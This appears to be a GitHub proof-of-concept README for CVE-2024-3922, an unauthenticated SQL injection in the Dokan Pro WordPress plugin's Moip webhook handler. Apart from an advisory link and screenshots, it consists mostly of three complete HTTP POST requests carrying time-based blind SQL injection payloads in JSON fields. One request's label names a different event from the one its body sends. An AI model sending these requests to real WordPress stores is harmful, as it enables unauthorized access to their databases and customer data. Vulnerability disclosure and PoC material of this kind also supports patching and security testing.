# CVE-2024-3922-Poc
Dokan Pro &lt;= 3.10.3 - Unauthenticated SQL Injection

https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/dokan-pro/dokan-pro-3103-unauthenticated-sql-injection

Require install plugin
![image](https://github.com/truonghuuphuc/CVE-2024-3922-Poc/assets/20487674/6d16fb7f-69f1-4446-9ded-4f08a477f642)


File: wp-content/plugins/dokan-pro/modules/moip/module.php 
Method: handle_moip_webhook
![image](https://github.com/truonghuuphuc/CVE-2024-3922-Poc/assets/20487674/229d231c-c4a0-469c-afb0-7244ed024079)
![image](https://github.com/truonghuuphuc/CVE-2024-3922-Poc/assets/20487674/6bc5a880-760e-4b8a-843c-1590021fd0a4)

Poc
Event: invoice.created
```
POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1
Host: <Host>
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.110.184:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5
Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US;
Connection: close
Content-Length: 135
Content-Type: application/json;charset=UTF-8

{"env":"1","event":"invoice.created","resource":{"subscription_code":"11111' and (select 1 from (select sleep( if(1=1,5,0) ))x )='"}}
```
![image](https://github.com/truonghuuphuc/CVE-2024-3922-Poc/assets/20487674/8756762e-bca6-464c-90ce-e3ba1399bcd6)

Event: subscription.expired
```
POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1
Host: <Host>
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.110.184:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5
Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US;
Connection: close
Content-Length: 129
Content-Type: application/json;charset=UTF-8

{"env":"1","event":"subscription.expired","resource":{"code":"11111' and (select 1 from (select sleep( if(1=1,5,0) ))x )='"}}
```
![image](https://github.com/truonghuuphuc/CVE-2024-3922-Poc/assets/20487674/4c921168-0399-42c6-b736-d06d57ccceb4)

Event: subscription.expired
```
POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1
Host: <Host>
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.110.184:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5
Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US;
Connection: close
Content-Length: 129
Content-Type: application/json;charset=UTF-8

{"env":"1","event":"subscription.updated","resource":{"status":"ACTIVE","code":"11111' and (select 1 from (select sleep( if(1=1,5,0) ))x )='"}}
```
![image](https://github.com/truonghuuphuc/CVE-2024-3922-Poc/assets/20487674/90ddbaa4-16d5-4288-98ad-23dc84a053e9)
